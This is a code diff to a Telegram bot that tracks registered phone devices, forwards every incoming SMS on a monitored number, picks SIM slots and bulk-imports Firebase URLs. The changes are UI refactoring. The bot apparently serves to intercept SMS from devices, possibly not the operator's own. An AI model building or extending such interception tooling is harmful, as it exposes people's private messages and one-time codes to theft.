@@ -3,17 +3,25 @@ from datetime import datetime, timezone
 
 from sqlalchemy.orm import Session
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
+from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters
 
 from app.config import get_settings
 from app.database import Device, SMSMessage, SessionLocal
 from app.bulk_firebase import bulk_import_from_txt
+from app.device_ui import (
+    device_set_keyboard,
+    format_device_set_card,
+    format_monitoring_card,
+    monitoring_keyboard,
+)
 from app.services import (
+    count_old_sms,
     device_status,
     get_active_device,
     get_monitoring_user_ids,
     register_device,
     get_monitor_profile,
+    select_sim_slot,
     set_firebase_url,
     show_device_by_id,
     set_user_phone,
@@ -183,7 +191,15 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
 
     db: Session = SessionLocal()
     try:
-        profile = start_monitoring(db, user.id)
+        profile, device = start_monitoring(db, user.id)
+        ignored = count_old_sms(db, device.id, profile.started_at)
+        latest_sms = (
+            db.query(SMSMessage)
+            .filter(SMSMessage.device_id == device.id)
+            .order_by(SMSMessage.received_at.desc())
+            .first()
+        )
+        test_msg = latest_sms.message[:40] if latest_sms else "Monitoring active"
     except ValueError as exc:
         await update.message.reply_text(f"❌ {exc}")
         return
@@ -191,12 +207,9 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         db.close()
 
     await update.message.reply_text(
-        f"🟢 *Monitoring Started!*\n\n"
-        f"📞 Number: `+{profile.phone_number}`\n"
-        f"📨 Ab is number par aane wale *saare incoming SMS* "
-        f"yahan forward honge.\n\n"
-        f"Phone par webhook setup karo ya superuser daemon chalao.",
-        parse_mode="Markdown",
+        format_monitoring_card(device, profile, ignored_sms=ignored, test_message=test_msg),
+        parse_mode="HTML",
+        reply_markup=monitoring_keyboard(),
     )
 
 
@@ -343,19 +356,12 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
 
-def format_single_device(device: Device, sms_count: int) -> str:
-    status = device_status(device)
-    status_icon = {"online": "🟢", "idle": "🟡", "offline": "🔴"}.get(status, "⚪")
-    phone = f"+{device.phone_number}" if device.phone_number else "N/A"
-    firebase = f"\n🔥 Firebase: `{device.firebase_source_url}`" if device.firebase_source_url else ""
-    return (
-        f"📱 *Device*\n\n"
-        f"🆔 ID: `{device.name}`\n"
-        f"{status_icon} Status: *{status}*\n"
-        f"📞 Phone: `{phone}`\n"
-        f"📨 SMS: *{sms_count}*\n"
-        f"🔑 API key: `{device.api_key}`"
-        f"{firebase}"
+async def send_device_set_ui(message, device: Device, profile: MonitorProfile | None = None) -> None:
+    sim_index = profile.selected_sim_index if profile else 0
+    await message.reply_text(
+        format_device_set_card(device, selected_sim=sim_index),
+        parse_mode="HTML",
+        reply_markup=device_set_keyboard(device),
     )
 
 
@@ -368,25 +374,16 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         db: Session = SessionLocal()
         try:
             active = get_active_device(db, user.id)
+            profile = get_monitor_profile(db, user.id)
             if active:
-                sms_count = (
-                    db.query(SMSMessage)
-                    .filter(SMSMessage.device_id == active.id)
-                    .count()
-                )
-                await update.message.reply_text(
-                    format_single_device(active, sms_count) + "\n\n"
-                    "Dusri device: `/a <deviceid>`",
-                    parse_mode="Markdown",
-                )
+                await send_device_set_ui(update.message, active, profile)
                 return
         finally:
             db.close()
 
         await update.message.reply_text(
             "Usage: `/a <deviceid>`\n\n"
-            "Example: `/a device001`\n\n"
-            "Sirf woh ek device dikhegi.",
+            "Example: `/a cac2ced675392f6c`",
             parse_mode="Markdown",
         )
         return
@@ -394,12 +391,7 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     deviceid = context.args[0]
     db: Session = SessionLocal()
     try:
-        device, _profile = await show_device_by_id(db, deviceid, user.id)
-        sms_count = (
-            db.query(SMSMessage)
-            .filter(SMSMessage.device_id == device.id)
-            .count()
-        )
+        device, profile = await show_device_by_id(db, deviceid, user.id)
     except LookupError:
         await update.message.reply_text(
             f"❌ Device `{deviceid}` nahi mili.\n"
@@ -414,10 +406,7 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     finally:
         db.close()
 
-    await update.message.reply_text(
-        format_single_device(device, sms_count),
-        parse_mode="Markdown",
-    )
+    await send_device_set_ui(update.message, device, profile)
 
 
 async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -428,28 +417,18 @@ async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     db: Session = SessionLocal()
     try:
         active = get_active_device(db, user.id)
+        profile = get_monitor_profile(db, user.id)
         if not active:
             await update.message.reply_text(
                 "📭 Koi active device nahi.\n\n"
-                "Device dekhne ke liye: `/a <deviceid>`\n"
-                "Sirf woh ek device dikhegi.",
+                "Device dekhne ke liye: `/a <deviceid>`",
                 parse_mode="Markdown",
             )
             return
-
-        sms_count = (
-            db.query(SMSMessage)
-            .filter(SMSMessage.device_id == active.id)
-            .count()
-        )
     finally:
         db.close()
 
-    await update.message.reply_text(
-        format_single_device(active, sms_count) + "\n\n"
-        "Dusri device khojne ke liye: `/a <deviceid>`",
-        parse_mode="Markdown",
-    )
+    await send_device_set_ui(update.message, active, profile)
 
 
 async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -607,6 +586,52 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     )
 
 
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    if not query or not query.data:
+        return
+
+    user = query.from_user
+    if not is_authorized(user.id if user else None):
+        await query.answer("Unauthorized")
+        return
+
+    await query.answer()
+    data = query.data
+    db: Session = SessionLocal()
+
+    try:
+        if data.startswith("sim:"):
+            _, device_id, sim_index = data.split(":")
+            profile = select_sim_slot(db, user.id, int(sim_index))
+            device = db.query(Device).filter(Device.id == int(device_id)).first()
+            if device:
+                await query.edit_message_text(
+                    format_device_set_card(device, selected_sim=int(sim_index)),
+                    parse_mode="HTML",
+                    reply_markup=device_set_keyboard(device),
+                )
+            return
+
+        if data.startswith("stop:"):
+            stop_monitoring(db, user.id)
+            await query.edit_message_text("🔴 <b>STOPPED</b>\n\nMonitoring band ho gaya.", parse_mode="HTML")
+            return
+
+        if data == "monitor:stop":
+            stop_monitoring(db, user.id)
+            await query.edit_message_text("🔴 <b>STOPPED</b>\n\nMonitoring band ho gaya.", parse_mode="HTML")
+            return
+
+        if data == "monitor:on":
+            await query.answer("Monitoring already ON", show_alert=False)
+    except Exception as exc:
+        logger.error("Callback error: %s", exc)
+        await query.edit_message_text(f"❌ Error: {exc}")
+    finally:
+        db.close()
+
+
 def build_telegram_app() -> Application | None:
     if not settings.telegram_bot_token:
         logger.warning("TELEGRAM_BOT_TOKEN not set; Telegram bot disabled")
@@ -617,7 +642,9 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("mynum", mynum_command))
     app.add_handler(CommandHandler("startmonitar", startmonitar_command))
+    app.add_handler(CommandHandler("startmonitor", startmonitar_command))
     app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
+    app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(CommandHandler("allfirebase", allfirebase_command))
     app.add_handler(CommandHandler("setfirebase", setfirebase_command))
     app.add_handler(MessageHandler(filters.Document.ALL, firebase_txt_upload_handler))
